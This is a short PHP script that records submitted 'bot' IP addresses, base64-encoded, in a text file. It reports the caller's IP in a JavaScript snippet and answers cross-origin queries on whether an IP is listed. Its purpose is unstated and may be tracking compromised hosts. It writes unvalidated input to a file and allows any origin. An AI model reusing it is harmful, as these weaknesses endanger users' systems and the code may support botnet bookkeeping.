<?php

$db = "botIPs.txt";
$addr = $_SERVER["REMOTE_ADDR"];

if(isset($_GET['getaddr'])){
	header('Content-type: text/javascript');
	echo 'var returnCitySN = {"cip": '.$addr.'};';
}


if(isset($_GET['ip'])){
	$botIP = @$_GET['ip'];
	$line = file_get_contents($db);
	$botIPs = explode("\n", $line);
	if (@in_array(base64_encode($botIP), $botIPs)) {
		echo "ip exist";
	}else {
		$bots = fopen($db, "a") or die("Unable to open bots file!");
		fwrite($bots, base64_encode($botIP) . "\n");
		fclose($bots);
	}
}


if(isset($_GET['search'])){

	$ip = @$_GET['search'];

	if (file_exists($db)) {
		$line = file_get_contents($db);
		$botIPs = explode("\n", $line);
		if (@in_array(base64_encode($ip), $botIPs)) {
			//header('Content-type: application/json');
			header('Access-Control-Allow-Origin: *');
			echo "in";
		}else {
			//header('Content-type: application/json');
			header('Access-Control-Allow-Origin: *');
			echo "bobo";
	}
	}
}
?>
